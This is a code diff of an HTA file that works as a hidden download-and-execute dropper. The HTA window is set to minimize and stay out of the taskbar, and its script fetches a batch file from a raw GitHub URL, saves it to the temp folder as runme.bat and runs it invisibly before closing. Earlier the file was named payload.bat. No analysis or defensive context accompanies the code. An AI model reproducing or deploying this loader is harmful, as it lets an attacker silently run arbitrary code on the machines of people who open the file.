@@ -1,17 +1,33 @@
 <html>
+<head>
+  <hta:application id="htaApp" 
+    applicationname="GitHubCmd"
+    border="thin"
+    caption="no"
+    showintaskbar="no"
+    singleinstance="yes"
+    windowstate="minimize">
+</head>
 <script language="javascript">
+try {
+    var url = "https://raw.githubusercontent.com/nigacode/-/main/myscript.bat"; // raw link
+
     var x = new ActiveXObject("MSXML2.XMLHTTP");
-    x.open("GET", "https://raw.githubusercontent.com/nigacode/-/refs/heads/main/payload.bat", false);
+    x.open("GET", url, false);
     x.send();
 
-    var shell = new ActiveXObject("WScript.Shell");
     var fso = new ActiveXObject("Scripting.FileSystemObject");
-    var temp = fso.GetSpecialFolder(2) + "\\payload.bat";
+    var temp = fso.GetSpecialFolder(2) + "\\runme.bat";
     var f = fso.CreateTextFile(temp, true);
     f.Write(x.responseText);
     f.Close();
 
+    var shell = new ActiveXObject("WScript.Shell");
     shell.Run(temp, 0, false);
     window.close();
+} catch (e) {
+    alert("Error: " + e.message);
+    window.close();
+}
 </script>
 </html>
